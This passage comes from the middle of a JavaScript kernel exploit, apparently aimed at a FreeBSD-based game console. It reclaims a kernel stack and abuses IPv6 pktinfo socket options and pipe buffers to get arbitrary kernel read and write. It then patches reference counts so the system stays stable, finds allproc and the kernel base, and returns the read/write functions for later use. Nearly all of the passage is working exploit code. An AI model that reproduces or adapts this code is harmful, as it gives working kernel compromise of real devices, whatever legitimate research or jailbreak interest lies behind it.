        p.write8(kprimCommonData.thr_index, kprimId);
        p.write8(kprimCommonData.exit, 1);

        await log(`Successfully reclaimed kstack (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
        if (debug) await log("Waiting for all kprim threads to exit (except the winner thread)...", LogLevel.DEBUG);

        await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads - 1);

        if (debug) await log("All kprim threads exited", LogLevel.DEBUG);

        break;
    }

    if (!winnerFd || !winnerLookupFd) {
        throw new Error("Loser");
    }

    function getKprimCurthrFromKstack(kstack) {
        const cnt = 0x1000 / 8;

        let kernelPtrs = {};

        for (let i = 0; i < cnt; i++) {
            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
            if (qword.low == 0) {
                continue;
            }

            // if the qword.hi starts with 0xffff8 then it is a kernel pointer
            if (((qword.hi & 0xffff8000) >>> 0) === 0xffff8000) {
                const key = qword.toString(16);
                if (!kernelPtrs[key]) {
                    kernelPtrs[key] = {};
                    kernelPtrs[key].val = qword;
                    kernelPtrs[key].count = 0;
                }
                kernelPtrs[key].count++;
            }
        }

        // find the kernel pointer with most occurrences
        let maxCount = 0;
        let maxKey = null;
        for (let key in kernelPtrs) {
            const val = kernelPtrs[key];
            if (val.count > maxCount) {
                maxCount = val.count;
                maxKey = key;
            }
        }

        if (maxCount < 2) {
            throw new Error("Failed to find curthr");
        }

        if (!maxKey) {
            return null;
        }

        return kernelPtrs[maxKey].val;
    }

    const OFFSET_IOV_BASE = 0x00;
    const OFFSET_IOV_LEN = 0x08;
    const SIZE_IOV = 0x10;
    const OFFSET_UIO_RESID = 0x18;
    const OFFSET_UIO_SEGFLG = 0x20;
    const OFFSET_UIO_RW = 0x24;

    function updateIovInKstack(origIovBase, newIovBase, uioSegflg, isWrite, len) {
        let stackIovOffset = -1;

        const scanStart = 0x2000;
        const scanMax = 0x4000 - 0x50;

        for (let i = scanStart; i < scanMax; i += 8) {
            const possibleIovBase = p.read8(kstack.add32(i + OFFSET_IOV_BASE));
            const possibleIovLen = p.read4(kstack.add32(i + OFFSET_IOV_LEN)) << 0;

            // if (possibleIovBase == origIovBase && possibleIovLen == len) {
            if ((possibleIovBase.low == origIovBase.low && possibleIovBase.hi == origIovBase.hi) && possibleIovLen == len) {
                const possibleUioResid = p.read8(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RESID)).low << 0;
                const possibleUioSegflg = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_SEGFLG)) << 0;
                const possibleUioRw = p.read4(kstack.add32(i + SIZE_IOV + OFFSET_UIO_RW)) << 0;

                if (possibleUioResid == len && possibleUioSegflg == 0 && possibleUioRw == isWrite) {
                    // if (debug) await log(`Found iov on kstack. pos = ${i.toString(16)} is_write = ${isWrite} len = ${len}`);
                    stackIovOffset = i;
                    break;
                }
            }
        }

        if (stackIovOffset == -1) {
            throw new Error("Failed to find iov");
        }


        p.write8(kstack.add32(stackIovOffset + OFFSET_IOV_BASE), newIovBase);
        p.write4(kstack.add32(stackIovOffset + SIZE_IOV + OFFSET_UIO_SEGFLG), uioSegflg);
    }



    const PHYS_PAGE_SIZE = 0x1000;

    const kstackKrwReadBuf = alloc(0x8);

    async function kstackKrwReadQword(kaddr) {
        // fill up pipe
        for (let i = 0; i < PIPE_SIZE; i += PHYS_PAGE_SIZE) {
            chain.add_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, PHYS_PAGE_SIZE);
        }
        await chain.run();

        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.READ_QWORD);
        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated
        
        updateIovInKstack(pipe_buf, kaddr, 1, 1, 8);

        await chain.syscall(SYS_READ, pipeSlowReadFd, pipe_buf, PIPE_SIZE); // read garbage

        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
            await new Promise((resolve) => setTimeout(resolve, 1));
        }

        await chain.syscall(SYS_READ, pipeSlowReadFd, kstackKrwReadBuf, 8); // read kernel data
        return p.read8(kstackKrwReadBuf);
    }


    const kstackKrwWriteBuf = alloc(0x8);
    /**
     * 
     * @param {int64} kaddr 
     * @param {int64|number} val 
     */
    async function kstackKrwWriteQword(kaddr, val) {
        p.write8(kstackKrwWriteBuf, val);

        // will hang until we write
        p.write8(kprimCommonData.cmd, kstackKernelRwCmd.WRITE_QWORD);
        await new Promise((resolve) => setTimeout(resolve, 15)); // wait a while until kernel stack is populated

        updateIovInKstack(pipe_buf, kaddr, 1, 0, 8);

        await chain.syscall(SYS_WRITE, pipeSlowWriteFd, kstackKrwWriteBuf, 8);

        while (p.read4(kprimCommonData.cmd) != kstackKernelRwCmd.NOP) {
            await new Promise((resolve) => setTimeout(resolve, 10));
        }
    }

    const OFFSET_THREAD_TD_PROC = 0x8;
    const OFFSET_P_FD = 0x48;
    const OFFSET_P_UCRED = 0x40;
    const OFFSET_FDESCENTTBL_FDT_OFILES = 0x8;

    
    if (debug) await log("getKprimCurthrFromKstack...", LogLevel.DEBUG);
    const kprimCurthr = getKprimCurthrFromKstack(kstack);
    if (debug) await log(`kprimCurthr = ${kprimCurthr.toString(16)}`, LogLevel.DEBUG);
    const curproc = await kstackKrwReadQword(kprimCurthr.add32(OFFSET_THREAD_TD_PROC));
    if (debug) await log(`curproc = ${curproc.toString(16)}`, LogLevel.DEBUG);
    const curprocUcred = await kstackKrwReadQword(curproc.add32(OFFSET_P_UCRED));
    if (debug) await log(`curprocUcred = ${curprocUcred.toString(16)}`, LogLevel.DEBUG);
    const curprocFd = await kstackKrwReadQword(curproc.add32(OFFSET_P_FD));
    if (debug) await log(`curprocFd = ${curprocFd.toString(16)}`, LogLevel.DEBUG);
    const fdescenttbl = await kstackKrwReadQword(curprocFd);
    if (debug) await log(`fdescenttbl = ${fdescenttbl.toString(16)}`, LogLevel.DEBUG);
    const curprocNfilesAddr = fdescenttbl;
    const curprocOfiles = fdescenttbl.add32(OFFSET_FDESCENTTBL_FDT_OFILES); // account for fdt_nfiles
    if (debug) await log(`curprocOfiles = ${curprocOfiles.toString(16)}`, LogLevel.DEBUG);


    const AF_INET = 2;
    const AF_INET6 = 28;
    const SOCK_STREAM = 1;
    const SOCK_DGRAM = 2;
    const IPPROTO_UDP = 17;
    const IPPROTO_IPV6 = 41;
    const IPV6_PKTINFO = 46;

    const masterSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victimSock = await chain.syscall_int32(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    // using p.malloc here bc these need to be preserved outside this function, the alloc allocations get freed
    const PKTINFO_SIZE = 0x14;
    const masterBuffer = p.malloc(PKTINFO_SIZE, 1);
    const slaveBuffer = p.malloc(PKTINFO_SIZE, 1);
    const pipemapBuffer = p.malloc(PKTINFO_SIZE, 1);
    const pktinfoSizeStore = p.malloc(0x8, 1);
    p.write8(pktinfoSizeStore, PKTINFO_SIZE);

    chain.add_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, PKTINFO_SIZE);
    chain.add_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, slaveBuffer, PKTINFO_SIZE);
    await chain.run();

    const masterSockFileDescAddr = curprocOfiles.add32(masterSock * 0x30);
    const victimSockFileDescAddr = curprocOfiles.add32(victimSock * 0x30);

    const masterSockFileAddr = await kstackKrwReadQword(masterSockFileDescAddr);
    const victimSockFileAddr = await kstackKrwReadQword(victimSockFileDescAddr);

    const masterSockSocketAddr = await kstackKrwReadQword(masterSockFileAddr);
    const victimSockSocketAddr = await kstackKrwReadQword(victimSockFileAddr);

    const masterPcb = await kstackKrwReadQword(masterSockSocketAddr.add32(0x18));
    const slavePcb = await kstackKrwReadQword(victimSockSocketAddr.add32(0x18));

    const masterPktopts = await kstackKrwReadQword(masterPcb.add32(0x120));
    const slavePktopts = await kstackKrwReadQword(slavePcb.add32(0x120));

    await kstackKrwWriteQword(masterPktopts.add32(0x10), slavePktopts.add32(0x10));

    await log(`Overlapped ipv6 sockets`, LogLevel.SUCCESS);

    function chainPushWriteToVictim(addr) {
        chain.push_write8(masterBuffer, addr);
        chain.push_write8(masterBuffer.add32(0x08), 0);
        chain.push_write4(masterBuffer.add32(0x10), 0);
        chain.self_healing_syscall(SYS_SETSOCKOPT, masterSock, IPPROTO_IPV6, IPV6_PKTINFO, masterBuffer, 0x14);
    }

    function chainPushIPv6Kread(addr, buffer) {
        chainPushWriteToVictim(addr);
        chain.self_healing_syscall(SYS_GETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfoSizeStore);
    }
    
    function chainPushIPv6Kwrite(addr, buffer) {
        chainPushWriteToVictim(addr);
        chain.self_healing_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
    }

    async function ipv6_kwrite(addr, buffer) {
        chainPushIPv6Kwrite(addr, buffer);
        await chain.run();
    }
    
    async function ipv6_kread8(addr) {
        chainPushIPv6Kread(addr, slaveBuffer);
        await chain.run();
        return p.read8(slaveBuffer);
    }

    // Create pipe pair and ultimate r/w prims
    const pipeMem = p.malloc(0x8, 1);
    await chain.syscall(SYS_PIPE2, pipeMem, 0);

    const pipeRead = p.read4(pipeMem);
    const pipeWrite = p.read4(pipeMem.add32(0x4));
    const pipeFiledescent = curprocOfiles.add32(pipeRead * 0x30);
    const pipeFile = await ipv6_kread8(pipeFiledescent);
    const pipeAddr = await ipv6_kread8(pipeFile);

    /**
     * 
     * @param {int64} src
     * @param {boolean} dereferenceSrc
     * @param {int64} dest 
     * @param {boolean} dereferenceDest
     * @param {number} length 
     */
    function chainPushCopyout(src, dereferenceSrc, dest, dereferenceDest, length) {
        chain.push_write8(pipemapBuffer, chainPushCopyout.value0);
        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyout.value1);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);

        if (dereferenceSrc) {
            chain.push_copy8(pipemapBuffer, src);
        } else {
            chain.push_write8(pipemapBuffer, src);
        }

        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);

        chain.self_healing_syscall_2(SYS_READ, pipeRead, false, dest, dereferenceDest, length);
    }
    chainPushCopyout.value0 = new int64(0x40000000, 0x40000000);
    chainPushCopyout.value1 = new int64(0x00000000, 0x40000000);

    /** 
     * 
     * @param {int64} src
     * @param {boolean} extraDereferenceSrc
     * @param {int64} dest
     * @param {boolean} dereferenceDest
     * @param {number} length
     */
    function chainPushCopyin(src, extraDereferenceSrc, dest, dereferenceDest, length) {
        chain.push_write8(pipemapBuffer, 0x0);
        chain.push_write8(pipemapBuffer.add32(0x8), chainPushCopyin.value);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr, pipemapBuffer);

        if (dereferenceDest) {
            chain.push_copy8(pipemapBuffer, dest);
        } else {
            chain.push_write8(pipemapBuffer, dest);
        }
        chain.push_write8(pipemapBuffer.add32(0x8), 0x0);
        chain.push_write4(pipemapBuffer.add32(0x10), 0x0);
        chainPushIPv6Kwrite(pipeAddr.add32(0x10), pipemapBuffer);

        chain.self_healing_syscall_2(SYS_WRITE, pipeWrite, false, src, extraDereferenceSrc, length);
    }
    chainPushCopyin.value = new int64(0x00000000, 0x40000000);






    const krw_qword_store = p.malloc(0x8, 1);
    async function kernel_write8(kaddr, val) {
        p.write8(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x8);
        await chain.run();
    }

    async function kernel_write4(kaddr, val) {
        p.write4(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x4);
        await chain.run();
    }

    async function kernel_write2(kaddr, val) {
        p.write2(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x2);
        await chain.run();
    }

    async function kernel_write1(kaddr, val) {
        p.write1(krw_qword_store, val);
        chainPushCopyin(krw_qword_store, false, kaddr, false, 0x1);
        await chain.run();
    }

    async function kernel_read8(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x8);
        await chain.run();
        return p.read8(krw_qword_store);
    }

    async function kernel_read4(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x4);
        await chain.run();
        return p.read4(krw_qword_store);
    }

    async function kernel_read2(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x2);
        await chain.run();
        return p.read2(krw_qword_store);
    }

    async function kernel_read1(kaddr) {
        chainPushCopyout(kaddr, false, krw_qword_store, false, 0x1);
        await chain.run();
        return p.read1(krw_qword_store);
    }

    function chainPushIncSocketRefcount(target_fd) {
        const fileDataAddrStore = alloc(0x8);
        const valueStore = alloc(0x8);

        const filedescentAddr = curprocOfiles.add32(target_fd * 0x30);
        chainPushCopyout(filedescentAddr, false, fileDataAddrStore, false, 0x8); // fde_file
        chainPushCopyout(fileDataAddrStore, true, fileDataAddrStore, false, 0x8); // f_data

        chain.push_write4(valueStore, 0x100);
        chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x4); // so_count = 0x100
    }


    function chainPushFixupBadFds() {
        const fileAddrStore = alloc(0x8);
        const fileDataAddrStore = alloc(0x8);

        const valueStore = alloc(0x8);

        for (let fd of fdsToFix) {
            const filedescentAddr = curprocOfiles.add32(fd * 0x30);
            chainPushCopyout(filedescentAddr, false, fileAddrStore, false, 0x8); // fde_file
            chainPushCopyout(fileAddrStore, true, fileDataAddrStore, false, 0x8); // f_data

            chain.push_write8(valueStore, 0x10);

            chain.push_inc8(fileDataAddrStore, 0x10); // shm_refs
            chainPushCopyin(valueStore, false, fileDataAddrStore, true, 0x8); // shm_refs = 0x10

            chain.push_inc8(fileAddrStore, 0x28); // f_count
            chainPushCopyin(valueStore, false, fileAddrStore, true, 0x8); // f_count = 0x10
        }
    }

    function chainPushFixupThreadKstack() {
        const thrKstackObjStore = alloc(0x8);
        const valueStore = alloc(0x8);

        chainPushCopyout(kprimCurthr.add32(0x468), false, thrKstackObjStore, false, 0x8); // td_kstack_obj

        chain.push_write8(valueStore, 0x0);
        chainPushCopyin(valueStore, false, kprimCurthr.add32(0x470), false, 0x8); // td_kstack

        chain.push_write4(valueStore, 0x10);
        chain.push_inc8(thrKstackObjStore, 0x84); // ref_count
        chainPushCopyin(valueStore, false, thrKstackObjStore, true, 0x4); // ref_count = 0x10
    }


    if (!fdsToFix.includes(winnerLookupFd)) {
        fdsToFix.push(winnerLookupFd);
    }
    
    await log("Creating fixup chain...", LogLevel.INFO);
    chainPushIncSocketRefcount(masterSock);
    chainPushIncSocketRefcount(victimSock);
    chainPushFixupBadFds();
    chainPushFixupThreadKstack();

    await log("Running fixup...", LogLevel.INFO);
    await chain.run();

    await chain.syscall(SYS_CLOSE, winnerLookupFd);

    await log("Fixes applied", LogLevel.SUCCESS);

    await log("Looking for allproc...", LogLevel.INFO);
    async function findAllproc() {
        let proc = curproc;
        const maxAttempt = 50;

        for (let i = 0; i < maxAttempt; i++) {
            if (((proc.hi & 0xffff8040) >>> 0) == 0xffff8040) {
                const dataBase = proc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
                if (((dataBase.low >>> 0) & 0xfff) == 0) {
                    return proc;
                }
            }
            proc = await kernel_read8(proc.add32(0x8)); // proc->p_list->le_prev
        }

        throw new Error("Failed to find allproc");
    }

    const allProc = await findAllproc();
    await log("Found allproc", LogLevel.INFO);

    const dataBase = allProc.sub32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
    const textBase = dataBase.sub32(OFFSET_KERNEL_DATA);

    const totalEndTime = performance.now();
    const totalDuration = totalEndTime - totalStartTime;

    p.write8(kprimCommonData.cmd, kstackKernelRwCmd.EXIT);

    await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads);

    await pinToCore(ogCore);
    await setRtprio(ogPrio, PRI_TIMESHARE);

    await chain.syscall(SYS_MUNMAP, bumpAllocatorBuffer, BUMP_ALLOCATOR_SIZE);

    await log(`Done! Exploit took:   ${toHumanReadableTime(totalDuration)}`, LogLevel.SUCCESS);
    if (debug) await log(`checkMemoryAccessFailCount: ${checkMemoryAccessFailCount}`, LogLevel.INFO);

    return {
        masterSock: masterSock,
        victimSock: victimSock,
        kdataBase: dataBase,
        ktextBase: textBase,
        read1: kernel_read1,
        read2: kernel_read2,
        read4: kernel_read4,
        read8: kernel_read8,
        write1: kernel_write1,
        write2: kernel_write2,
        write4: kernel_write4,
        write8: kernel_write8,
        curthrAddr: kprimCurthr,
        curprocAddr: curproc,
        procUcredAddr: curprocUcred,
        procFdAddr: curprocFd,
        pipeAddr: pipeAddr,
        pipeMem: pipeMem
    };
}